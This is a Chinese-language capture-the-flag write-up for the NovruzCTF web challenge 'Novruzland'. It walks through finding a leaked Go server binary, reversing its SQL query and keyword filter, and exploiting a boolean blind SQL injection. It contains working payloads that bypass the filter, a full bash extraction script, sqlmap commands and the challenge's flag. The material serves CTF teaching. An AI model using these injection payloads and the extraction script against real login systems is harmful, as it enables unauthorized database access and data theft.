# NovruzCTF - Novruzland (Web)

## 题目信息

- **比赛**: NovruzCTF
- **题目**: Novruzland（扎卡塔拉 / 卡拉杜祖）
- **类型**: Web
- **地址**: `http://95.111.234.103:33097/`
- **Flag格式**: `novruzctf{}`
- **状态**: 已解

## Flag

```
novruzctf{23546ca577fb70941f62da30bb93605fdd22f9d4d072b1674372b0be2cff7231}
```

## 解题过程

### 1. 信息收集

访问目标页面，是一个简单的登录表单，标题为 "Novruzland"。

```html
<form action="/login" method="POST">
    Username: <input type="text" name="username"/>
    Password: <input type="text" name="password"/>
</form>
```

检查 `robots.txt`，发现隐藏路径：

```
User-agent: *
Disallow: /dev
```

### 2. 发现隐藏二进制文件

访问 `/dev` 路径时，虽然页面内容与首页相同，但 **HTTP 响应头** 中暴露了关键信息：

```
Files: robots.txt, index.html, d4d02ab944e79608ee06b09d00eb1132
```

直接访问 `/{hash}` 下载到一个 **10MB 的 Go 语言 ELF 二进制文件**——这就是服务端程序本身。

```
ELF 64-bit LSB executable, x86-64, Go BuildID=m-CL-sKHv10fF8tfBLOR/...
```

### 3. 逆向分析二进制

由于是 Go 编译的未 strip 二进制，符号信息完整保留。

**Go 函数列表：**
```
main.dev_handler
main.download_handler
main.index_handler
main.isvalid          ← 输入验证函数
main.login_handler
main.main
main.robots_hanlder
```

**关键发现 - SQL 查询：**
```sql
SELECT password FROM users WHERE username ='...'
```

**关键发现 - 数据库初始化：**
```sql
INSERT INTO users VALUES ('revker', 'kerrev', 'Cup{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}')
```

这表明：
- 使用 MySQL 数据库（`go-sql-driver/mysql`）
- users 表有 3 列：username、password、第 3 列（存放 flag）
- 存在硬编码用户 `revker`，密码 `kerrev`
- Flag 在第 3 列中，占位符为 `Cup{xxx...}`（64 字符）

### 4. 确认凭据有效

```bash
curl -X POST http://95.111.234.103:33097/login \
  -d "username=revker&password=kerrev"
# {+} Correct pass!
```

### 5. 分析输入过滤 (isvalid 函数)

通过 fuzz 测试发现 `isvalid` 函数的过滤规则：

| 关键字/字符 | 状态 |
|------------|------|
| `AND` (大小写) | **被禁** |
| `NOT` | **被禁** |
| `(` `)` | **被禁** |
| `password` / `pass` / `passwd` | **被禁** |
| `hash` / `note` | **被禁** |
| `OR` | 允许 |
| `'` (单引号) | 允许 |
| `--` (注释) | 允许 |
| `=` `>` `<` | 允许 |
| `LIKE` | 允许（但导致超时） |
| `UNION SELECT` | 允许（但导致超时/崩溃） |

**关键限制：**
- 无法使用 `AND`，排除布尔盲注的常规手法
- 无法使用 `()`，排除 `SUBSTRING()`、`ASCII()`、`LENGTH()` 等函数
- `UNION SELECT` 会导致服务端超时（Go 代码可能无法处理多行结果）
- `password` 关键字被禁，无法直接引用该列

### 6. 确定 Flag 列名

需要猜测第 3 列的列名。通过构造 `' OR {column}>''-- ` 测试列是否存在：

```bash
# flag列 - 不匹配（列可能不存在或值为空）
curl -d "username='+OR+flag>''--+&password=kerrev" → {-} Incorrect pass!

# cup列 - 不匹配
curl -d "username='+OR+cup>''--+&password=kerrev" → {-} Incorrect pass!

# secret列 - 匹配！
curl -d "username='+OR+secret>''--+&password=kerrev" → {+} Correct pass!
```

**第 3 列列名为 `secret`。**

### 7. SQL 盲注提取 Flag

#### 核心技巧：`~` 终止符

直接用字符串 `>` 比较会有问题：由于 MySQL 字符串比较是逐字符进行的，较长字符串在前缀相同时总是大于较短字符串。例如 `'novruzctf{3abc}' > 'novruzctf{3'` 永远为真。

**解决方案**：在比较字符串末尾添加 `~`（ASCII 126，非常高的字符），消除长度差异的影响：

```
secret > 'novruzctf{X~'
```

- 如果 flag 中该位置的字符 > X，结果为真（Correct）
- 如果 flag 中该位置的字符 <= X，结果为假（Incorrect）
- `~` 确保了不会因为 flag 更长而产生误判

#### 注入 Payload

```
username: ' OR secret>'novruzctf{...已知前缀...}{测试字符}~'--
password: kerrev
```

#### 自动化提取脚本

```bash
#!/bin/bash
URL="http://95.111.234.103:33097/login"
known="novruzctf{"
charset='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-}'

for pos in $(seq 1 65); do
  for (( i=0; i<${#charset}; i++ )); do
    c="${charset:$i:1}"
    test_str="${known}${c}~"
    resp=$(curl -s --max-time 8 -X POST "$URL" \
      -d "username='+OR+secret>'${test_str}'--+&password=kerrev")
    if echo "$resp" | grep -q "Incorrect"; then
      known="${known}${c}"
      echo "pos $pos: '$c' -> $known"
      break
    fi
  done
  [ "$c" = "}" ] && break
done
echo "Flag: $known"
```

经过 65 轮请求（每轮平均约 10 次尝试），成功提取完整 flag。

## 漏洞/知识点分析

### 1. 信息泄露
- `robots.txt` 暴露 `/dev` 路径
- `/dev` 响应头中的 `Files` 字段泄露了服务端二进制文件名
- 二进制文件可直接下载，暴露了源码逻辑

### 2. SQL 注入
- 登录查询直接拼接用户输入：`SELECT password FROM users WHERE username='$input'`
- 虽然有 `isvalid` 过滤函数，但过滤不完整：
  - 禁了 `AND` 但没禁 `OR`
  - 禁了 `()` 但没禁比较运算符 `>` `<` `=`
  - 禁了 `password` 列名但没禁其他列名

### 3. SQL 盲注中的字符串比较技巧
- **`~` 终止符技巧**：在字典序比较中，用高 ASCII 字符消除字符串长度差异的影响，实现精确的逐字符提取
- 这是绕过无法使用 `SUBSTRING()` 等函数时的替代方案

## 知识点
- **Go 二进制信息泄露** — 通过下载服务端 ELF 直接看到查询逻辑
- **布尔盲注** — 用响应差异判断条件真假
- **字典序比较技巧** — 使用 `~` 消除长度带来的误判

## 使用的工具

- **curl** - HTTP 请求与 SQL 注入测试
- **grep** - 二进制文件字符串搜索（替代 `strings` 命令）
- **bash 脚本** - 自动化盲注提取

## 脚本归档
- Go：`CTF_Writeups/scripts_go/NovruzCTF_Novruzland.go`
- Python：`CTF_Writeups/scripts_python/NovruzCTF_Novruzland.py`

## 命令行提取关键数据（无 GUI）

```bash
# 读取 /dev 响应头，拿到二进制文件名
curl -s -D - http://95.111.234.103:33097/dev -o /dev/null

# 下载二进制
curl -s -o server.bin http://95.111.234.103:33097/d4d02ab944e79608ee06b09d00eb1132

# 快速提取关键字符串
strings -a server.bin | rg "SELECT|INSERT|isvalid|login_handler"
```

## 推荐工具与优化解题流程

> 参考 `CTF_TOOLS_EXTENSION_PLAN.md` 中的 Web 和 Reverse 工具推荐。本题涉及 Go 二进制逆向 + SQL 盲注两个阶段。

### 1. SQLMap — SQL 注入自动化（推荐首选）

[SQLMap](https://github.com/sqlmapproject/sqlmap) 是 SQL 注入自动化的标准工具，可自动检测注入点并提取数据。

**安装：**
```bash
pip install sqlmap
# 或
git clone https://github.com/sqlmapproject/sqlmap.git
```

**详细操作步骤：**

**Step 1：检测注入点**
```bash
sqlmap -u "http://95.111.234.103:33097/login" \
  --data="username=admin&password=kerrev" \
  -p username \
  --level=3 --risk=2
```

**Step 2：绕过 isvalid 过滤**

由于 `AND`、`()` 等被过滤，需要配置 SQLMap 的 tamper 脚本：
```bash
# 使用 --technique=B 限制为布尔盲注
# 使用 --prefix 和 --suffix 自定义注入包装
sqlmap -u "http://95.111.234.103:33097/login" \
  --data="username=admin&password=kerrev" \
  -p username \
  --technique=B \
  --prefix="'" \
  --suffix="-- " \
  --string="Correct" \
  --not-string="Incorrect" \
  --level=5 --risk=3
```

**Step 3：如果标准模式失败，使用自定义注入模板**

由于 `()` 被过滤（导致 `SUBSTRING()` 等函数不可用），SQLMap 的标准盲注可能失败。此时可以：

```bash
# 使用 --technique=B --no-cast 避免 CAST() 函数
# 使用 --tamper 自定义过滤规则
sqlmap -u "http://95.111.234.103:33097/login" \
  --data="username=admin&password=kerrev" \
  -p username \
  --technique=B \
  --no-cast \
  --tamper=between \
  --dbms=mysql
```

**Step 4：枚举数据**
```bash
# 列出数据库
sqlmap ... --dbs

# 列出表
sqlmap ... --tables

# 提取 secret 列
sqlmap ... -D <database> -T users -C secret --dump
```

**注意**：由于本题过滤了 `()`，SQLMap 的标准盲注方法可能不适用。此时手写的 `~` 终止符 + `>` 比较技巧是更好的选择。SQLMap 更适合过滤较少的场景。

---

### 2. Ghidra — Go 二进制逆向分析

在逆向分析 Go 二进制（提取 SQL 查询、isvalid 过滤规则）阶段，Ghidra 比 `grep -ao` 更高效。

**详细操作步骤：**

**Step 1：导入 Go 二进制**
1. File → Import File → 选择下载的 10MB ELF 文件
2. 自动分析（Go 二进制未 strip，符号完整）

**Step 2：快速定位关键函数**
1. Symbol Tree 搜索 `main.isvalid` → 查看反编译伪代码
2. 直接从伪代码读取过滤规则（哪些关键字被禁）
3. 搜索 `main.login_handler` → 看到 SQL 查询拼接方式

**Step 3：提取 SQL 查询和表结构**
1. 搜索字符串 `SELECT` → 找到 `SELECT password FROM users WHERE username ='`
2. 搜索 `INSERT` → 找到初始化数据（用户名、密码、列结构）
3. 确认第 3 列列名（通过反编译代码而非猜测）

**优势**：反编译伪代码直接暴露 `isvalid` 的所有过滤规则和 SQL 查询结构，无需通过 fuzz 测试逐个发现。

---

### 3. Burp Suite — 注入测试与自动化

**详细操作步骤：**

**Step 1：Repeater 手动测试**
1. 捕获登录请求 → Send to Repeater
2. 修改 `username` 参数，测试各种注入：
   ```
   ' OR 1=1--
   ' OR secret>''--
   ' OR secret>'novruzctf{~'--
   ```
3. 根据响应（Correct/Incorrect）判断注入效果

**Step 2：Intruder 自动化盲注**
1. Send to Intruder
2. 在 `username` 参数中标记测试字符位置
3. Payload 类型选择 "Character substitution"
4. 自动遍历字符集提取 flag

---

### 4. Radare2 — 命令行快速分析 Go 二进制

```bash
r2 -A d4d02ab944e79608ee06b09d00eb1132

# 列出 main 包函数
[0x00401000]> afl~main.
# main.isvalid, main.login_handler, main.main 等

# 反汇编 isvalid 函数
[0x00401000]> pdf @main.isvalid
# 查看过滤规则中检查的字符串

# 查找所有字符串引用
[0x00401000]> iz~SELECT
[0x00401000]> iz~INSERT
```

---

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 |
|------|---------|---------|------|
| **Ghidra** | Go 二进制逆向 | ~5 分钟 | 反编译直接看 isvalid 过滤规则和 SQL 查询 |
| **SQLMap** | SQL 注入自动化 | 可能失败 | 自动化程度高，但 `()` 过滤导致受限 |
| **Burp Suite** | 手动注入测试 | ~10 分钟 | Repeater 方便迭代 |
| **bash 脚本** | 盲注提取 | ~5 分钟 | 本题最有效的方案（`~` 终止符技巧） |

**推荐流程**：Ghidra 逆向 isvalid 规则 + SQL 查询 → Burp Repeater 确认注入可行性 → 自定义 bash/Python 脚本盲注提取（因 `()` 被禁，SQLMap 受限）→ 总计约 15 分钟。
